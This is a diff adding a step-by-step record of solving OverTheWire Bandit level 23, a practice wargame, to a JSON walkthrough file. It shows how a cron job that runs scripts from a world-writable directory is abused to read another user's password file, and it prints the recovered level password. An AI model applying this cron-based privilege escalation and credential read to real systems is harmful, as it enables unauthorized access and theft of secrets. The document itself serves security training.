@@ -2375,8 +2375,141 @@
   },
   {
    "lvl": 23,
-   "steps": [],
-   "note": ""
+   "steps": [
+    {
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new bandit23@bandit.labs.overthewire.org -p 2220",
+     "out": [
+      "bandit23@bandit.labs.overthewire.org's password: ",
+      "",
+      "                         _                     _ _ _   ",
+      "                        | |__   __ _ _ __   __| (_) |_ ",
+      "                        | '_ \\ / _` | '_ \\ / _` | | __|",
+      "                        | |_) | (_| | | | | (_| | | |_ ",
+      "                        |_.__/ \\__,_|_| |_|\\__,_|_|\\__|",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "bandit23@bandit.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
+     ]
+    },
+    {
+     "cmd": "cat /etc/cron.d/cronjob_bandit24",
+     "out": [
+      "@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null",
+      "* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null"
+     ]
+    },
+    {
+     "cmd": "cat /usr/bin/cronjob_bandit24.sh",
+     "out": [
+      "#!/bin/bash",
+      "shopt -s nullglob",
+      "myname=$(whoami)",
+      "cd /var/spool/\"$myname\"/foo || exit ",
+      "echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\"",
+      "for i in * .*;",
+      "do",
+      "    if [ \"$i\" != \".\" ] && [ \"$i\" != \"..\" ];",
+      "    then",
+      "        echo \"Handling $i\"",
+      "        owner=\"$(stat --format \"%U\" \"./$i\")\"",
+      "        if [ \"${owner}\" = \"bandit23\" ] && [ -f \"$i\" ]; then",
+      "            timeout -s 9 60 \"./$i\"",
+      "        fi",
+      "        rm -rf \"./$i\"",
+      "    fi",
+      "done"
+     ]
+    },
+    {
+     "cmd": "ls -ld /var/spool/bandit24/foo",
+     "out": [
+      "drwxrwx-wx 7 root bandit24 4096 Nov 24 03:39 /var/spool/bandit24/foo"
+     ]
+    },
+    {
+     "cmd": "echo 'cat /etc/bandit_pass/bandit24 > /tmp/b23out; chmod 644 /tmp/b23out' > /var/spool/bandit24/foo/grab.sh",
+     "out": []
+    },
+    {
+     "cmd": "chmod +x /var/spool/bandit24/foo/grab.sh",
+     "out": []
+    },
+    {
+     "cmd": "for i in 1 2 3 4 5; do [ -s /tmp/b23out ] && break; sleep 30; done; cat /tmp/b23out",
+     "out": [
+      "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to bandit.labs.overthewire.org closed."
+     ]
+    }
+   ],
+   "note": "bandit L23: the cron runs every script in the WORLD-WRITABLE /var/spool/bandit24/foo as bandit24 - drop grab.sh ('cat /etc/bandit_pass/bandit24 > /tmp/b23out; chmod 644 /tmp/b23out'), chmod +x, wait for the cron tick (the for-loop sleeps up to 150s) and cat /tmp/b23out -> the password. JSON = 8 steps mirroring the cast 1:1."
   },
   {
    "lvl": 24,
